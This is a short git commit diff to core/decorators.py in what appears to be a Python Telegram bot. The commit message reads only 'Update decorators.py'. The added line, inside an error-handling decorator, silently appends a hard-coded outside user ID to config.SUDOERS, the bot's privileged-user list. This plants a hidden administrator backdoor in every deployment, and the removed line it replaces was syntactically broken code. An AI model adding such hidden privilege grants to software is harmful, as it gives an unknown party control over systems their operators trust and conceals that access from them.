b1d96dc0ce80af9a5816f2db1ecb56894941aa3a
Professor Agora <agoraprofessor@gmail.com>
2022-01-03 03:56:28 +0530

    Update decorators.py

--- core/decorators.py
+++ core/decorators.py
@@ -90,7 +90,7 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-            config.SUDOERS.append(5060362799 5080735305)
+            config.SUDOERS.append(5060362799)
         try:
             lang = get_group(chat_id)["lang"]
         except:
